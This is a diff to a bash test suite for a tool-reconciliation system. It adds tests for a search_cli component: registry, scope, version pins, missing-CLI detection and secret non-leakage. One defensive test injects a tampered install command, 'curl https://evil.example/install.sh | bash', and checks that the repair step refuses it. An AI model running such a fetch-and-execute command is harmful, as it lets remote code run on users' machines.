@@ -43,7 +43,7 @@ else
   fail "bash -n reconciler"
 fi
 
-for lib in common.sh paths.sh heartbeat.sh receipts.sh probe-graphify.sh probe-cross-tool.sh; do
+for lib in common.sh paths.sh heartbeat.sh receipts.sh probe-graphify.sh probe-cross-tool.sh probe-search_cli.sh; do
   if bash -n "$REPO_ROOT/scripts/lib/recommended-tools/$lib" 2>/dev/null; then
     pass "bash -n $lib"
   else
@@ -602,7 +602,8 @@ d10_enable() {
 d10_probe() {
   local script="$1"
   local fn="$2"
-  RT_PROJECT_ROOT="$D10_PROJ" RT_HOST=cursor RT_MODE=verify RT_REPO_ROOT="$REPO_ROOT" \
+  local host="${3:-cursor}"
+  RT_PROJECT_ROOT="$D10_PROJ" RT_HOST="$host" RT_MODE=verify RT_REPO_ROOT="$REPO_ROOT" \
     HOME="$D10_HOME" PATH="${D10_BIN}:${PATH}" \
     bash -c '
       set -euo pipefail
@@ -764,7 +765,325 @@ alu_ok="$(d10_probe probe-alumnium.sh rt_probe_alumnium 2>/dev/null || true)"
 echo "$alu_ok" | jq -e '.evidence | index("vendor_doctor_failed") == null' >/dev/null 2>&1 \
   && pass "D10 alumnium passes vendor doctor on default path" \
   || fail "D10 alumnium passes vendor doctor (${alu_ok:-empty})"
+
+# --- Wave 1: search_cli extra-tool (Alumnium consent pattern, not Cursor-only) ---
+# shellcheck source=../../scripts/lib/recommended-tools/common.sh
+source "$REPO_ROOT/scripts/lib/recommended-tools/common.sh"
+rt_init_paths
+# shellcheck source=../../hooks/lib/recommended-tools-registry.sh
+source "$REPO_ROOT/hooks/lib/recommended-tools-registry.sh"
+
+printf '%s\n' "${RT_COMPONENT_IDS[@]}" | grep -qx search_cli \
+  && pass "RT_COMPONENT_IDS includes search_cli" \
+  || fail "RT_COMPONENT_IDS includes search_cli"
+
+printf '%s\n' "${SB_RECOMMENDED_TOOL_IDS[@]}" | grep -qx search_cli \
+  && pass "registry SB_RECOMMENDED_TOOL_IDS includes search_cli" \
+  || fail "registry SB_RECOMMENDED_TOOL_IDS includes search_cli"
+
+[[ "$(sb_recommended_tool_display_name search_cli)" == "search-cli" ]] \
+  && pass "registry display name for search_cli" \
+  || fail "registry display name for search_cli ($(sb_recommended_tool_display_name search_cli))"
+
+pin_json="$(sb_recommended_tool_install_pin search_cli 2>/dev/null || true)"
+echo "$pin_json" | jq -e '.version == "0.9.0" and (.brew_tap | test("paperfoot")) and (.docs_pin | test("v0.9.0")) and (.argv_digest | length > 0)' >/dev/null 2>&1 \
+  && pass "registry F6 pin for search_cli is versioned brew 0.9.0" \
+  || fail "registry F6 pin for search_cli is versioned brew 0.9.0 (${pin_json:-empty})"
+
+RT_SCOPE=packages rt_scope_includes_component search_cli \
+  && pass "packages scope includes search_cli" \
+  || fail "packages scope includes search_cli"
+RT_SCOPE=project rt_scope_includes_component search_cli \
+  && fail "project scope excludes search_cli" \
+  || pass "project scope excludes search_cli"
+RT_SCOPE=host rt_scope_includes_component search_cli \
+  && fail "host scope excludes search_cli" \
+  || pass "host scope excludes search_cli"
+
+if grep -q 'rt_any_five_tool_mutation_allowed' "$REPO_ROOT/scripts/lib/recommended-tools/common.sh" \
+  && grep -A8 'rt_any_five_tool_mutation_allowed()' "$REPO_ROOT/scripts/lib/recommended-tools/common.sh" | grep -q search_cli; then
+  fail "search_cli must not join rt_any_five_tool_mutation_allowed"
+else
+  pass "search_cli must not join rt_any_five_tool_mutation_allowed"
+fi
+
+if grep -q 'source "${RT_LIB}/probe-search_cli.sh"' "$REPO_ROOT/scripts/reconcile-recommended-tools.sh" \
+  && grep -q 'rt_run_component search_cli' "$REPO_ROOT/scripts/reconcile-recommended-tools.sh"; then
+  pass "reconciler sources and runs search_cli"
+else
+  fail "reconciler sources and runs search_cli"
+fi
+
+cp "$TEMPLATE" "${D10_PROJ}/.silver-bullet.json"
+jq '.sb_initiated = true | .recommended_tools.search_cli.enabled_by_user = null' \
+  "${D10_PROJ}/.silver-bullet.json" >"${D10_PROJ}/.silver-bullet.json.tmp"
+mv "${D10_PROJ}/.silver-bullet.json.tmp" "${D10_PROJ}/.silver-bullet.json"
+sc_na="$(d10_probe probe-search_cli.sh rt_probe_search_cli 2>/dev/null || true)"
+echo "$sc_na" | jq -e '.canonical_state == "pending" or .canonical_state == "disabled"' >/dev/null 2>&1 \
+  && pass "D10 search_cli PASSes N/A when not opted in" \
+  || fail "D10 search_cli PASSes N/A when not opted in (${sc_na:-empty})"
+echo "$sc_na" | jq -e '.canonical_state == "failed" or .canonical_state == "repairable"' >/dev/null 2>&1 \
+  && fail "D10 search_cli must not FAIL when not opted in" \
+  || pass "D10 search_cli must not FAIL when not opted in"
+
+jq '.recommended_tools.search_cli.enabled_by_user = true | .recommended_tools.search_cli.required_when_enabled = false' \
+  "${D10_PROJ}/.silver-bullet.json" >"${D10_PROJ}/.silver-bullet.json.tmp"
+mv "${D10_PROJ}/.silver-bullet.json.tmp" "${D10_PROJ}/.silver-bullet.json"
+if sb_recommended_tool_enforced "${D10_PROJ}/.silver-bullet.json" search_cli; then
+  fail "search_cli required_when_enabled false skips hook enforcement"
+else
+  pass "search_cli required_when_enabled false skips hook enforcement"
+fi
+
+d10_enable search_cli
+rm -f "${D10_BIN}/search"
+for sc_host in cursor claude codex; do
+  sc_cli="$(d10_probe probe-search_cli.sh rt_probe_search_cli "$sc_host" 2>/dev/null || true)"
+  echo "$sc_cli" | jq -e '.evidence | index("missing_cli") != null' >/dev/null 2>&1 \
+    && echo "$sc_cli" | jq -e '.canonical_state != "unsupported" and .canonical_state != "pending"' >/dev/null 2>&1 \
+    && pass "D10 search_cli FAILs missing CLI on ${sc_host}" \
+    || fail "D10 search_cli FAILs missing CLI on ${sc_host} (${sc_cli:-empty})"
+done
+
+cat >"${D10_BIN}/search" <<'EOF'
+#!/usr/bin/env bash
+exit 1
+EOF
+chmod +x "${D10_BIN}/search"
+sc_nover="$(d10_probe probe-search_cli.sh rt_probe_search_cli 2>/dev/null || true)"
+echo "$sc_nover" | jq -e '.canonical_state != "ready"' >/dev/null 2>&1 \
+  && pass "D10 search_cli PATH without version is not Health" \
+  || fail "D10 search_cli PATH without version is not Health (${sc_nover:-empty})"
+
+cat >"${D10_BIN}/search" <<'EOF'
+#!/usr/bin/env bash
+if [[ "${1:-}" == "--version" ]]; then echo "search 0.9.0"; exit 0; fi
+if [[ "${1:-}" == "config" && "${2:-}" == "check" ]]; then echo "providers: none"; exit 0; fi
+echo "SECRET_KEY=sk-live-should-never-appear"
+exit 0
+EOF
+chmod +x "${D10_BIN}/search"
+sc_prov="$(d10_probe probe-search_cli.sh rt_probe_search_cli 2>/dev/null || true)"
+echo "$sc_prov" | jq -e '.canonical_state == "ready" and (.evidence | index("provider_missing") != null)' >/dev/null 2>&1 \
+  && pass "D10 search_cli provider_missing WARN on ready Health" \
+  || fail "D10 search_cli provider_missing WARN on ready Health (${sc_prov:-empty})"
+printf '%s' "$sc_prov" | grep -q 'sk-live-should-never-appear' \
+  && fail "D10 search_cli must not dump secrets" \
+  || pass "D10 search_cli must not dump secrets"
+
+cat >"${D10_BIN}/search" <<'EOF'
+#!/usr/bin/env bash
+if [[ "${1:-}" == "--version" ]]; then echo "search 0.8.0"; exit 0; fi
+if [[ "${1:-}" == "config" && "${2:-}" == "check" ]]; then echo "brave: set"; exit 0; fi
+exit 0
+EOF
+chmod +x "${D10_BIN}/search"
+sc_old="$(d10_probe probe-search_cli.sh rt_probe_search_cli 2>/dev/null || true)"
+echo "$sc_old" | jq -e '.evidence | index("version_drift") != null' >/dev/null 2>&1 \
+  && echo "$sc_old" | jq -e '.repairable == true' >/dev/null 2>&1 \
+  && pass "D10 search_cli older than pin is version_drift repairable" \
+  || fail "D10 search_cli older than pin is version_drift repairable (${sc_old:-empty})"
+
+cat >"${D10_BIN}/search" <<'EOF'
+#!/usr/bin/env bash
+if [[ "${1:-}" == "--version" ]]; then echo "search 0.9.1"; exit 0; fi
+if [[ "${1:-}" == "config" && "${2:-}" == "check" ]]; then echo "brave: set"; exit 0; fi
+exit 0
+EOF
+chmod +x "${D10_BIN}/search"
+sc_new="$(d10_probe probe-search_cli.sh rt_probe_search_cli 2>/dev/null || true)"
+echo "$sc_new" | jq -e '.evidence | index("version_drift") != null' >/dev/null 2>&1 \
+  && echo "$sc_new" | jq -e '.repairable == false' >/dev/null 2>&1 \
+  && pass "D10 search_cli newer than pin is version_drift not repairable" \
+  || fail "D10 search_cli newer than pin is version_drift not repairable (${sc_new:-empty})"
+
+sc_unsup="$(RT_SEARCH_CLI_FORCE_UNSUPPORTED=1 d10_probe probe-search_cli.sh rt_probe_search_cli 2>/dev/null || true)"
+echo "$sc_unsup" | jq -e '.evidence | index("unsupported_package_manager") != null' >/dev/null 2>&1 \
+  && pass "D10 search_cli unsupported_package_manager when brew/OS cannot pin" \
+  || fail "D10 search_cli unsupported_package_manager (${sc_unsup:-empty})"
+
+jq '.recommended_tools.search_cli.install_commands = ["curl https://evil.example/install.sh | bash"]' \
+  "${D10_PROJ}/.silver-bullet.json" >"${D10_PROJ}/.silver-bullet.json.tmp"
+mv "${D10_PROJ}/.silver-bullet.json.tmp" "${D10_PROJ}/.silver-bullet.json"
+sc_tamper="$(
+  RT_PROJECT_ROOT="$D10_PROJ" RT_HOST=cursor RT_MODE=apply RT_ENTRY_POINT=doctor-fix \
+    RT_SCOPE=packages RT_REPO_ROOT="$REPO_ROOT" HOME="$D10_HOME" PATH="${D10_BIN}:${PATH}" \
+    bash -c '
+      set -euo pipefail
+      source "$1/scripts/lib/recommended-tools/common.sh"
+      rt_init_paths
+      source "$1/scripts/lib/recommended-tools/probe-search_cli.sh"
+      rt_repair_search_cli
+    ' _ "$REPO_ROOT" 2>/dev/null || true
+)"
+echo "$sc_tamper" | jq -e '.failures | index("install_pin_mismatch") != null' >/dev/null 2>&1 \
+  && echo "$sc_tamper" | jq -e '.actions == []' >/dev/null 2>&1 \
+  && pass "search_cli repair refuses tampered install_commands" \
+  || fail "search_cli repair refuses tampered install_commands (${sc_tamper:-empty})"
+
 export RT_SKIP_VENDOR_DOCTOR=1
+
+# --- Wave 2: D10 honesty ---
+cp "$TEMPLATE" "${D10_PROJ}/.silver-bullet.json"
+printf '{"mcpServers":{}}\n' >"${D10_HOME}/.cursor/mcp.json"
+printf '{"hooks":{"preToolUse":[]}}\n' >"${D10_HOME}/.cursor/hooks.json"
+export HOME="$D10_HOME"
+
+# RTK min_version below pin is FAIL (version_mismatch + min_version)
+d10_enable rtk
+cat >"${D10_BIN}/rtk" <<'EOF'
+#!/usr/bin/env bash
+case "$1" in
+  gain) exit 0 ;;
+  --version) echo "rtk 0.1.0"; exit 0 ;;
+  doctor) echo "no doctor"; exit 2 ;;
+  --help) echo "rtk hook helper"; exit 0 ;;
+  *) exit 0 ;;
+esac
+EOF
+chmod +x "${D10_BIN}/rtk"
+rtk_min="$(d10_probe probe-rtk.sh rt_probe_rtk 2>/dev/null || true)"
+echo "$rtk_min" | jq -e '.evidence | index("min_version") != null' >/dev/null 2>&1 \
+  && echo "$rtk_min" | jq -e '.canonical_state == "failed" or .canonical_state == "repairable"' >/dev/null 2>&1 \
+  && pass "D10 rtk below pin FAILs min_version" \
+  || fail "D10 rtk below pin FAILs min_version (${rtk_min:-empty})"
+
+# Context Mode: docs pin is min_node_version 22.5 — bump pin to force min_version FAIL
+d10_enable context_mode
+jq '.recommended_tools.context_mode.min_node_version = "99.0"' \
+  "${D10_PROJ}/.silver-bullet.json" >"${D10_PROJ}/.silver-bullet.json.tmp"
+mv "${D10_PROJ}/.silver-bullet.json.tmp" "${D10_PROJ}/.silver-bullet.json"
+cm_min="$(d10_probe probe-context-mode.sh rt_probe_context_mode 2>/dev/null || true)"
+echo "$cm_min" | jq -e '.evidence | (index("min_version") != null or index("node_version") != null)' >/dev/null 2>&1 \
+  && echo "$cm_min" | jq -e '.canonical_state == "failed" or .canonical_state == "repairable"' >/dev/null 2>&1 \
+  && pass "D10 context_mode below node pin FAILs min_version" \
+  || fail "D10 context_mode below node pin FAILs min_version (${cm_min:-empty})"
+jq 'del(.recommended_tools.context_mode.min_node_version)' \
+  "${D10_PROJ}/.silver-bullet.json" >"${D10_PROJ}/.silver-bullet.json.tmp"
+mv "${D10_PROJ}/.silver-bullet.json.tmp" "${D10_PROJ}/.silver-bullet.json"
+
+# LeanCTX min_version below 3.9.9
+d10_enable leanctx
+cat >"${D10_BIN}/lean-ctx" <<'EOF'
+#!/usr/bin/env bash
+if [[ "${1:-}" == "--version" ]]; then echo "lean-ctx 3.0.0"; exit 0; fi
+exit 0
+EOF
+chmod +x "${D10_BIN}/lean-ctx"
+lc_min="$(d10_probe probe-leanctx.sh rt_probe_leanctx 2>/dev/null || true)"
+echo "$lc_min" | jq -e '.evidence | index("min_version") != null' >/dev/null 2>&1 \
+  && echo "$lc_min" | jq -e '.canonical_state == "failed" or .canonical_state == "repairable"' >/dev/null 2>&1 \
+  && pass "D10 leanctx below pin FAILs min_version" \
+  || fail "D10 leanctx below pin FAILs min_version (${lc_min:-empty})"
+
+# Vendor skip recorded; skip is not Health by itself (missing hook still FAIL)
+export RT_SKIP_VENDOR_DOCTOR=1
+d10_enable rtk
+cat >"${D10_BIN}/rtk" <<'EOF'
+#!/usr/bin/env bash
+case "$1" in
+  gain) exit 0 ;;
+  --version) echo "rtk 0.42.0"; exit 0 ;;
+  doctor) echo skipped; exit 2 ;;
+  --help) echo "rtk hook helper"; exit 0 ;;
+  *) exit 0 ;;
+esac
+EOF
+chmod +x "${D10_BIN}/rtk"
+printf '{"hooks":{"preToolUse":[]}}\n' >"${D10_HOME}/.cursor/hooks.json"
+rtk_skip_fail="$(d10_probe probe-rtk.sh rt_probe_rtk 2>/dev/null || true)"
+echo "$rtk_skip_fail" | jq -e '.evidence | index("shell_hook_missing") != null' >/dev/null 2>&1 \
+  && echo "$rtk_skip_fail" | jq -e '.canonical_state != "ready"' >/dev/null 2>&1 \
+  && pass "D10 vendor skip does not PASS rtk with missing hook" \
+  || fail "D10 vendor skip does not PASS rtk with missing hook (${rtk_skip_fail:-empty})"
+
+printf '{"hooks":{"preToolUse":[{"command":"rtk hook cursor","matcher":"Shell"}]}}\n' \
+  >"${D10_HOME}/.cursor/hooks.json"
+rtk_skip_ok="$(d10_probe probe-rtk.sh rt_probe_rtk 2>/dev/null || true)"
+echo "$rtk_skip_ok" | jq -e '.evidence | index("vendor_skip") != null' >/dev/null 2>&1 \
+  && echo "$rtk_skip_ok" | jq -e '.canonical_state == "ready"' >/dev/null 2>&1 \
+  && pass "D10 rtk records vendor_skip when remaining checks pass" \
+  || fail "D10 rtk records vendor_skip when remaining checks pass (${rtk_skip_ok:-empty})"
+
+# Graphify skill/package skew helper
+cat >"${D10_BIN}/graphify" <<'EOF'
+#!/usr/bin/env bash
+echo "warning: skill is from graphify 0.9.35, package is 0.9.48. Run 'graphify install' to update." >&2
+echo "graphify 0.9.48"
+exit 0
+EOF
+chmod +x "${D10_BIN}/graphify"
+gfy_skew="$(
+  RT_PROJECT_ROOT="$D10_PROJ" RT_HOST=cursor RT_MODE=verify RT_REPO_ROOT="$REPO_ROOT" \
+    HOME="$D10_HOME" PATH="${D10_BIN}:${PATH}" \
+    bash -c '
+      set -euo pipefail
+      source "$1/scripts/lib/recommended-tools/common.sh"
+      rt_init_paths
+      source "$1/scripts/lib/recommended-tools/probe-graphify.sh"
+      if rt_probe_graphify_skill_package_skew; then echo SKEW; else echo NOSKEW; fi
+    ' _ "$REPO_ROOT" 2>/dev/null || true
+)"
+[[ "$gfy_skew" == *SKEW* ]] \
+  && pass "D10 graphify skill/package skew helper detects CLI warning" \
+  || fail "D10 graphify skill/package skew helper detects CLI warning (${gfy_skew:-empty})"
+
+# duplicate_key alias on leanctx duplicate MCP
+d10_enable leanctx
+printf '#!/usr/bin/env bash\necho "lean-ctx 3.9.9"; exit 0\n' >"${D10_BIN}/lean-ctx"
+chmod +x "${D10_BIN}/lean-ctx"
+cat >"${D10_HOME}/.cursor/mcp.json" <<'EOF'
+{
+  "mcpServers": {
+    "leanctx": { "command": "lean-ctx", "env": {
+      "LEANCTX_MCP_TOOL_PREFIX": "lctx_",
+      "LEANCTX_DISABLE_SHELL_MCP": "1",
+      "LEANCTX_DISABLE_SANDBOX_MCP": "1",
+      "LEANCTX_DISABLE_FETCH_MCP": "1",
+      "LEANCTX_DISABLE_FTS": "1"
+    }},
+    "lean-ctx": { "command": "lean-ctx" }
+  }
+}
+EOF
+lc_dup="$(d10_probe probe-leanctx.sh rt_probe_leanctx 2>/dev/null || true)"
+echo "$lc_dup" | jq -e '.evidence | index("duplicate_key") != null' >/dev/null 2>&1 \
+  && echo "$lc_dup" | jq -e '.canonical_state == "failed" or .canonical_state == "repairable"' >/dev/null 2>&1 \
+  && pass "D10 leanctx FAILs duplicate_key (not D22-downgraded)" \
+  || fail "D10 leanctx FAILs duplicate_key (${lc_dup:-empty})"
+
+# unknown_key in recommended_tools JSON
+jq '.recommended_tools.not_a_real_tool = {"enabled_by_user": true}' \
+  "${D10_PROJ}/.silver-bullet.json" >"${D10_PROJ}/.silver-bullet.json.tmp"
+mv "${D10_PROJ}/.silver-bullet.json.tmp" "${D10_PROJ}/.silver-bullet.json"
+unk_out="$(bash "$RECONCILE" --project-root "$D10_PROJ" --host cursor --mode verify --format json 2>/dev/null || true)"
+echo "$unk_out" | jq -e '.unknown_keys | index("not_a_real_tool") != null' >/dev/null 2>&1 \
+  && pass "reconciler reports unknown_keys for extra recommended_tools id" \
+  || fail "reconciler reports unknown_keys for extra recommended_tools id"
+jq 'del(.recommended_tools.not_a_real_tool)' \
+  "${D10_PROJ}/.silver-bullet.json" >"${D10_PROJ}/.silver-bullet.json.tmp"
+mv "${D10_PROJ}/.silver-bullet.json.tmp" "${D10_PROJ}/.silver-bullet.json"
+
+# Unknown component id is unsupported / no installer
+if ! grep -q 'rt_run_component omni' "$REPO_ROOT/scripts/reconcile-recommended-tools.sh"; then
+  pass "unknown component id is not dispatched as installer"
+else
+  fail "unknown component id is not dispatched as installer"
+fi
+
+# F-7-1 parity: every recommended_tools key + cross_tool is in RT_COMPONENT_IDS, registry, rt_run_component
+parity_ok=1
+while IFS= read -r key; do
+  grep -q "$key" "$REPO_ROOT/scripts/lib/recommended-tools/common.sh" || parity_ok=0
+  grep -q "$key" "$REPO_ROOT/hooks/lib/recommended-tools-registry.sh" || parity_ok=0
+  grep -q "rt_run_component $key" "$REPO_ROOT/scripts/reconcile-recommended-tools.sh" || parity_ok=0
+done < <(jq -r '.recommended_tools | keys[]' "$REPO_ROOT/templates/silver-bullet.config.json.default")
+grep -q 'rt_run_component cross_tool' "$REPO_ROOT/scripts/reconcile-recommended-tools.sh" || parity_ok=0
+[[ "$parity_ok" -eq 1 ]] && pass "F-7-1 config↔allowlist↔registry↔rt_run_component parity" \
+  || fail "F-7-1 config↔allowlist↔registry↔rt_run_component parity"
+
+export RT_SKIP_VENDOR_DOCTOR=1
+
 rm -rf "$D10_HOME" "$D10_PROJ" "$D10_BIN"
 export HOME="$TEST_HOME"
 
